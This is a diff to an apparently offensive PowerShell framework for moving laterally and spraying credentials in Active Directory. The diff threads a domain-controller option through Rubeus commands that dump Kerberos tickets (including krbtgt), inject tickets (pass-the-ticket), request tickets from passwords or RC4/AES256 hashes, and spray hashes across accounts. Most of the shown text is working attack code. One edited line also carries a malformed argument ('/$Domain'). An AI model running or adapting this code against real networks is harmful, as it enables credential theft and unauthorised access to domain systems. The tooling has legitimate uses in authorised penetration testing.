@@ -142,7 +142,7 @@ if ($Method -ne "") {
             Write-Host "[*] " -ForegroundColor Yellow -NoNewline
             Write-Host "Invalid Method specified"
             Write-Host "[*] " -ForegroundColor Yellow -NoNewline
-            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, All"
             return
         }
     }
@@ -482,52 +482,50 @@ if (!$CurrentUser) {
     
     # If the method is not RDP proceed
     if ($Method -ne "RDP") {
-    if ($Method -ne "MSSQL"){
-        
-        # If the system is domain joined, store the current user ticket into a variable to restore later
-        if ($DomainJoined) {
-            try {
+    if ($Method -ne "MSSQL") {
+    # If the system is domain joined, store the current user ticket into a variable to restore later
+    if ($DomainJoined) {
+        try {
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "tgtdeleg /nowrap /domain:$domain /dc:$DomainController" | Out-String
+            } else {
                 $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
-                $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
             }
-            catch {
-                try {
-                    if (!$CheckAdmin) {
-                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
-                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+            $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+        } catch {
+            try {
+                if (!$CheckAdmin) {
+                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
+                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
 
-                        if ($OriginalUserTicket -notlike "doI*") {
-                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
-                            Write-Host "Unable to retrieve any Kerberos tickets"
-                            Write-Host "1"
-                            return
-                        }
+                    if ($OriginalUserTicket -notlike "doI*") {
+                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                        Write-Host "Unable to retrieve any Kerberos tickets"
+                        return
                     }
-                    elseif ($CheckAdmin) {
-                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /username:$env:username /nowrap" | Out-String
-                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+                } elseif ($CheckAdmin) {
+                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /username:$env:username /nowrap" | Out-String
+                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
 
-                        if ($OriginalUserTicket -notlike "doI*") {
-                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
-                            Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
-                            Write-Host "2"
-                            return
-                        }
+                    if ($OriginalUserTicket -notlike "doI*") {
+                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
+                        return
                     }
                 }
-                catch {
-                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                    Write-Host "Unable to retrieve any Kerberos tickets"
-                    Write-Host "3"
-                    return
-                }
+            } catch {
+                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                Write-Host "Unable to retrieve any Kerberos tickets"
+                return
             }
         }
     }
+}
+
 
     
-    if ($Method -ne "RDP"){
-    # Check if ticket has been provided
+    if ($Method -ne "RDP") {
+    # Check if a ticket has been provided
     if ($Ticket -ne "") {
         if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
             $Ticket = Get-Content -Path $Ticket -Raw
@@ -542,7 +540,7 @@ if (!$CurrentUser) {
             return
         }
 
-        # Use regular expression to extract the Username
+        # Use regular expressions to extract ticket information
         $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
         $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
         $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
@@ -562,29 +560,50 @@ if (!$CurrentUser) {
         Write-Host
 
         # Attempt to inject the ticket into the current session
-        $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
+        if ($DomainController -ne "") {
+            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket /domain:$Domain /dc:$DomainController"
+        } else {
+            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket /domain:$Domain"
+        }
+
         if ($InjectTicket -like "*Error 1398*") {
             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-host "Ticket expired"
+            Write-Host "Ticket expired"
             klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController " | Out-Null
+            } else {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+            }
             return
         }
-    }
-    elseif ($Password -ne "") {
+    } elseif ($Password -ne "") {
         klist purge | Out-Null
 
         if ($UserDomain -ne "") {
-            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"
+            if ($DomainController -ne "") {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt"
+            } else {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"
+            }
         } elseif ($UserDomain -eq "") {
-            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
+            if ($DomainController -ne "") {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt"
+            } else {
+                $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
+            }
         }
 
         if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Incorrect password or username"
             klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController " | Out-Null
+            } else {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+            }
             return
         }
 
@@ -592,26 +611,41 @@ if (!$CurrentUser) {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Incorrect password or username"
             klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            if ($DomainController -ne "") {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController " | Out-Null
+            } else {
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+            }
             return
         }
-    }
-    elseif ($Hash -ne "") {
+    } elseif ($Hash -ne "") {
         if ($Hash.Length -eq 32) {
             klist purge | Out-Null
 
             if ($UserDomain -ne "") {
-                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt"
+                } else {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"
+                }
             }
             if ($UserDomain -eq "") {
-                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt"
+                } else {
+                    $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"
+                }
             }
 
             if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
 
@@ -619,25 +653,40 @@ if (!$CurrentUser) {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
-        }
-        elseif ($Hash.Length -eq 64) {
+        } elseif ($Hash.Length -eq 64) {
             klist purge | Out-Null
 
             if ($UserDomain -ne "") {
-                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt"
+                } else {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt"
+                }
             }
             if ($UserDomain -eq "") {
-                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"
+                if ($DomainController -ne "") {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt"
+                } else {
+                    $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"
+                }
             }
 
             if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
 
@@ -645,20 +694,23 @@ if (!$CurrentUser) {
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Incorrect hash or username"
                 klist purge | Out-Null
-                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                if ($DomainController -ne "") {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /$Domain /dc:$DomainController" | Out-Null
+                } else {
+                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket /domain:$Domain" | Out-Null
+                }
                 return
             }
-        }
-        else {
+        } else {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
             Write-Host 
             Write-Host
             return
-            
-                }
-            }
         }
+    }
+}
+
     }
 }
 
@@ -3895,8 +3947,16 @@ $searchResult = $searcher.FindOne()
 }
            # Hash Spraying
             if ($SprayHash -ne ""){
-            if ($SprayHash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain" | Out-String}
-            elseif ($SprayHash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain" | Out-String}
+            if ($SprayHash.Length -eq 32){
+                if ($DomainController -ne ""){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain /dc:$DomainController" | Out-String}
+                else {$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain" | Out-String}
+            }
+                
+            elseif ($SprayHash.Length -eq 64){
+                if ($DomainController -ne ""){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain /dc:$DomainController" | Out-String}
+                else {$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain" | Out-String}
+            }
+            
             
             # Check for Unhandled Rubeus exception
             if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -5611,7 +5671,7 @@ switch ($Method) {
         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Invalid Method specified"
         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+        Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, All"
         return
       
       }
